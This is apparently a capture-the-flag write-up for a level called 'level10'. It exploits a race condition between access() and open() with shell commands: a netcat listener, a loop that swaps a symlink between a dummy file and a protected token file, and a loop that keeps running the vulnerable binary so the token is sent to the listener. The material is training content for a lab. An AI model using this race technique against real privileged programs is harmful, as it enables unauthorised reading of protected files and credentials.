In this task we have the race condition vulnurability between access() and open() functions. To exploit this case we should replace the file between 2 operations.

We start with listening the port 6969 with netcat (using -k to keep listen after disconnect) in terminal 1

nc -lk 6969

Than we create a dummy file that we can read in a 2nd terminal

touch /tmp/dummy

After that we create a loop that alternates a symlink between a dummy and a target file with token (-f flag means the force creating even if the file ia already exists)

while true; do
    ln -sf /tmp/dummy /tmp/pwn
    ln -sf /home/user/level10/token /tmp/pwn
done

The final step is to create a loop (in the third terminal) that would repeatedly run the binary, sending the symlink (from loop in terminal 2) to the listener from the terminal 1

while true; do
    /home/user/level10/level10 /tmp/pwn 127.0.0.1
done